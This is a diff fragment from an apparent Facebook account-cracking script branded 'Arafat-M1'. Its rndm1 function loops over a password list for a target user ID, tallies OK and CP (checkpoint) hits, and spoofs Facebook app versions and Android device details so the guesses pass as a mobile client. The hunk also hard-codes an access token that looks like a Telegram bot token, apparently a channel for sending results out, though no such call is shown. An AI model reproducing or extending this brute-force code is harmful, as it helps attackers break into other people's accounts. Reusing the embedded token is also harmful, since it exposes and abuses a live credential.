@@ -614,8 +614,8 @@ def rndm1(uid,passlist):
         global oks
         sys.stdout.write(f'\r\r{B}❲{G}𝐀𝐫𝐚𝐟𝐚𝐭-M1{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
-                for ps in pwx:
-                accessToken = '6675644006:AAE8C6LsKX9JfZ8UfdTv-LvONBUKEv3Sywk'
+                 for pas in passlist:
+                        accessToken = '6675644006:AAE8C6LsKX9JfZ8UfdTv-LvONBUKEv3Sywk'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                         fbbv = str(random.randint(111111111,999999999))
                         android_version = device['android_version']
